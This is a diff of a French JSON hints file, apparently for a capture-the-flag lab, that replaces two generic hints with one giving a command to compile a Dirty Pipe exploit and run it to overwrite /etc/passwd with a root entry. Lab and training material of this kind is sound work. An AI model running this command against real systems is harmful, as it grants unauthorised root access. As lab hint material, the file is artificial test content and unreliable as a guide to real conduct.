@@ -1,12 +1,7 @@
 [
   {
-    "title": "Indice 1 : Vecteur d'attaque",
-    "cost": 15,
-    "content": "Recherche la documentation officielle et les techniques éprouvées pour exploiter dirtypipe-cve."
-  },
-  {
-    "title": "Indice 2 : Format du drapeau",
+    "title": "Compilation de l'exploit",
     "cost": 25,
-    "content": "Le drapeau respecte le format standard : CYBERLAB{...}."
+    "content": "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd 1 'root:pwned...'"
   }
 ]
